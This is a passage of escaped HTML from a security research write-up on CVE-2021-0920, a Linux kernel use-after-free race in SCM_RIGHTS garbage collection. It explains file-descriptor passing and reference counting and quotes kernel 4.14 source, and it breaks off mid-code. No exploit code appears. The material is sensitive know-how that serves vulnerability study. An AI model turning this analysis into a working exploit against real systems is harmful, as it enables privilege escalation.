system. CVE-2021-0920 is a vulnerability within this garbage collection system. By winning a race condition during the garbage collection process, an adversary can exploit the UAF on the socket buffer, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sk_buff&lt;/span&gt;&lt;span&gt;&amp;nbsp;object. In the following sections, we&amp;rsquo;ll explain the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;&amp;nbsp;garbage collection system and the details of the vulnerability. The analysis is based on the Linux 4.14 kernel.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.qjne51ghywhs\"&gt;&lt;span&gt;What is SCM_RIGHTS&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c1\"&gt;?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Linux developers can share file descriptors (fd) from one process to another using the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://man7.org/linux/man-pages/man7/unix.7.html\"&gt;SCM_RIGHTS datagram with the sendmsg syscall&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. When a process passes a file descriptor to another process, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;&amp;nbsp;will add a reference to the underlying &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;file&lt;/span&gt;&lt;span&gt;&amp;nbsp;struct. This means that the process that is sending the file descriptors can immediately close the file descriptor on their end, even if the receiving process has not yet accepted and taken ownership of the file descriptors. When the file descriptors are in the &amp;ldquo;queued&amp;rdquo; state (meaning the sender has passed the fd and then closed it, but the receiver has not yet accepted the fd and taken ownership), specialized garbage collection is needed. To track this &amp;ldquo;queued&amp;rdquo; state, this &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://lwn.net/Articles/779472/\"&gt;LWN article&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;does a great job explaining &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;reference counting, and it&amp;#39;s recommended reading before continuing on with this blogpost.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.4irl9u2c0bda\"&gt;&lt;span class=\"ykcrMYlEiJ-c1\"&gt;Sending&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;As stated previously, a unix domain socket uses the syscall &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sendmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;to send a file descriptor to another socket. To explain the reference counting that occurs during &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;we&amp;rsquo;ll start from the sender&amp;rsquo;s point of view. We start with the kernel&lt;/span&gt;&lt;span&gt;&amp;nbsp;function &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_stream_sendmsg&lt;/span&gt;&lt;span&gt;, which implements the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sendmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;syscall. &lt;/span&gt;&lt;span&gt;To implement the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;&amp;nbsp;functionality, the kernel uses the structure &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_fp_list&lt;/span&gt;&lt;span&gt;&amp;nbsp;for managing all the transmitted &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;file&lt;/span&gt;&lt;span&gt;&amp;nbsp;structures. &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_fp_list&lt;/span&gt;&lt;span&gt;&amp;nbsp;stores the list of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;file&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;pointers to be passed. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.c96392c69342188701600f62dd8e18978b65546f\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_fp_list &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;short&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; count&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;short&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; max&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;user_struct &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;file &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;[&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;SCM_MAX_FD&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_stream_sendmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;invokes &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_send&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L1886\"&gt;af_unix.c#L1886&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) to initialize the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_fp_list&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure, linked by the&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_cookie&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure on the stack.&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.15e3db5d013417d6ac8097f3ef1d76367028ae48\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_cookie &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;pid &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;pid&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Skb credentials */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14 ykcrMYlEiJ-c7\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;scm_fp_list &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c23 ykcrMYlEiJ-c7\"&gt;/* Passed files &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_creds &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;creds&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Skb credentials &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;#ifdef&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&amp;nbsp;CONFIG_SECURITY_NETWORK&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u32 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; secid&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Passed security ID &amp;nbsp; */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;#endif&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;To be more specific, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_send&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;rarr; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;__scm_send&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;rarr; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_fp_copy&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/core/scm.c#L68\"&gt;scm.c#L68&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) reads the file descriptors from the userspace and initializes &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_cookie-&amp;gt;fp&lt;/span&gt;&lt;span&gt;&amp;nbsp;which can contain &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_MAX_FD&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;file structures.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Since the Linux kernel uses the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sk_buff&lt;/span&gt;&lt;span&gt;&amp;nbsp;(also known as socket buffers or &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;) object to manage all types of socket datagrams, the kernel also needs to invoke the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_scm_to_skb&lt;/span&gt;&lt;span&gt;&amp;nbsp;function to link the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_cookie-&amp;gt;fp&lt;/span&gt;&lt;span&gt;&amp;nbsp;to a corresponding &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;&amp;nbsp;object. This occurs in &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_attach_fds&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/scm.c#L103\"&gt;scm.c#L103&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c31 c20 c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.7d908bfdc8aa4cf5bff47e5320fdce7dc7e2949e\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;hellip;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* Need to duplicate file references for the sake of garbage&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* collection. &amp;nbsp;Otherwise a socket in the fps might become a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* candidate for GC while the skb is not yet queued.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;scm_fp_dup&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(!&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;return&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;ENOMEM&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;hellip;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_fp_dup&lt;/span&gt;&lt;span&gt;&amp;nbsp;call in &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_attach_fds&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;increases the reference count of the file descriptor that&amp;rsquo;s being passed so the file is still valid even after the sender closes the transmitted file descriptor later:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.48360ede8275e8fd7e6e61cd084a628de58bb15f\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_fp_list &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;scm_fp_dup&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_fp_list &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_fp_list &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;new_fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;int&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(!&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;return&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; new_fpl &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;kmemdup&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;offsetof&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_fp_list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;fp&lt;/span&gt;&lt;span 